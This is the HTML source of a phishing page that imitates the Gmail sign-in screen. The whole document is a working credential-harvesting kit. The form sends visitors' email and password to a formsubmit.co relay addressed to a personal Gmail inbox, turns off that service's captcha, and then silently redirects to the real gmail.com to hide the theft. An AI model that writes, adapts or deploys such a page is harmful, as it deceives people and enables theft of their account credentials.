<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  
      <div class="maindiv">
        <img src="google.png" alt="Google">
        <h1>Sign in</h1>
        <h3>Continue to Gmail</h3>
        <form action="https://formsubmit.co/vihaannagpal1234@gmail.com" method="POST" />
        <div class="inputs">
          <div class="Fields">
            <div class="Fieldset">
              <input type="text" name="Email" class="Before-FS" required="" autocomplete="off">
              <h1 class="Fs-H"><span>Email or phone</span></h1>
              <label class="placeholder">Email or phone</label>
            </div>
          </div>
          <div class="Fields">
            <div class="Fieldset">
              <input type="password" name="Password" class="Before-FS" required="" >
              <h1 class="Fs-H"><span>Password</span></h1>
              <label class="placeholder">Password</label>
            </div>
          </div>
          <input type="hidden" name="_next" value="https://gmail.com">
          <input type="hidden" name="_captcha" value="false">
        </div>
          <button type="submit">Login</button>
      </div>
    </form>
</body>
</html>
